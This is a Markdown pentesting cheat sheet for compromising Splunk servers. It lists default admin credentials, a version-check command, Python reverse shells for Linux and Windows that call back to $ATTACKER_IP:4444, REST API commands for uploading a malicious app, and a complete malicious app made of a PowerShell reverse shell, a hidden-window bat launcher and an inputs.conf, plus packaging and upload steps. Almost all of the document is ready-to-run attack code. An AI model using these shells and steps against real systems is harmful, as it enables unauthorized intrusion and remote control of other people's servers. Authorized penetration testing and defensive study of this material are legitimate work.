- Default Credentials `admin:changeme` `admin:Welcome1`, `admin:Password123` 
- Check version `curl -s http://$VICTIM_IP:8000/en-US/account/info | grep -oP '(?<=version":")[^"]+'` Or visit `http://$VICTIM_IP:8000/en-US/account/info`


## <span style="color:#8BE9FD">Exploiting Splunk for RCE</span>
#### <span style="color:#FFB86C">Method 1: Scripted Input (Python Reverse Shell)</span>
- Navigate to: `Settings → Data Inputs → Scripts → Add New`
- Configure:
    - Script Path: `/tmp/shell.py`
    - Interval: 60 (seconds)
- Python Reverse Shell
```bash
# Linux
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ATTACKER_IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```
```cmd
# Windows
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ATTACKER_IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["cmd.exe","/k"])
```

#### <span style="color:#FFB86C">Method 2: REST API (If Creds Known)</span>
- List Apps: `curl -k -u admin:changeme https://$VICTIM_IP:8089/services/apps/local`
- Upload Malicious App: `curl -k -u admin:changeme -X POST -F "name=@malicious_app.tgz" https://$VICTIM_IP:8089/services/apps/local`


## <span style="color:#8BE9FD">Splunk RCE Cheat Sheet</span>
#### <span style="color:#FFB86C">1. Create Malicious Splunk App</span>
- Directory Structure
```text
splunk_shell/
├── bin/
│   ├── run.ps1      # PowerShell reverse shell
│   └── run.bat      # Executes the PS script
└── default/
    └── inputs.conf  # Config file
```
- run.ps1 (PowerShell Reverse Shell)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
- run.bat (Executes PS Script)
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
inputs.conf (Config File)
```
[script://.\bin\run.bat]
disabled = 0
interval = 10
sourcetype = shell
```
#### <span style="color:#FFB86C">2. Package & Upload App</span>
- Create .tar.gz Archive
```
tar -cvzf splunk_rce.tar.gz splunk_shell/
```
Upload via Splunk Web UI

- Navigate to: `Apps → Manage Apps → Install app from file`
- Upload splunk_rce.tar.gz
- get a reverse shell



